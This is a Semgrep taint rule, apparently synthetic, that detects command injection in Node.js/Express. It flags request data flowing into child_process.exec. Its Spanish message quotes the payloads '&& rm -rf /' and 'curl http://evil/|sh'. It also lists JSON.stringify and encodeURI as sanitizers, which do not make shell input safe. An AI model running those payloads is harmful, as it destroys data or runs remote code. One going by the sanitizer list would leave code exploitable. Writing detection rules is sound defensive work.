rules:
- id: synthetic-cve202011978
  languages:
  - javascript
  - typescript
  severity: ERROR
  message: "Posible inyecci\xF3n de comandos remota (RCE) similar a CVE-2020-11978:\
    \ se construye un comando de shell con datos controlados por el usuario (por ejemplo,\
    \ desde req.body, req.query, req.params o req.headers) y se ejecuta mediante child_process.exec\
    \ / execSync. Un atacante puede encadenar comandos arbitrarios (p.ej. \"&& rm\
    \ -rf /\" o \"curl http://evil/|sh\"), lo que permite ejecuci\xF3n remota de c\xF3\
    digo con los privilegios del proceso. Esta clase de patr\xF3n es an\xE1logo al\
    \ abuso de DAGs/\u201Ctriggers\u201D remotos en CVE-2020-11978, donde par\xE1\
    metros controlados por el atacante terminan formando parte de un comando de sistema.\n"
  metadata:
    cve: CVE-2020-11978
    source: CISA_KEV
    category: security
    technology:
    - nodejs
    - express
    vulnerability: command-injection
    likelihood: HIGH
    impact: HIGH
    confidence: MEDIUM
    cwe: 'CWE-20: Improper Input Validation'
    owasp: A03:2021 - Injection
    references:
    - https://cwe.mitre.org/data/definitions/20.html
  mode: taint
  pattern-sources:
  - pattern-either:
    - pattern: $REQ.body
    - pattern: $REQ.query
    - pattern: $REQ.params
    - pattern: $REQ.headers
  pattern-sinks:
  - pattern-either:
    - pattern: exec($CMD, ...)
    - pattern: execSync($CMD, ...)
    - pattern: child_process.exec($CMD, ...)
    - pattern: child_process.execSync($CMD, ...)
    - pattern: require('child_process').exec($CMD, ...)
    - pattern: require('child_process').execSync($CMD, ...)
  pattern-sanitizers:
  - pattern: JSON.stringify(...)
  - pattern: encodeURIComponent(...)
  - pattern: encodeURI(...)
  options:
    taint_assume_safe_functions: false
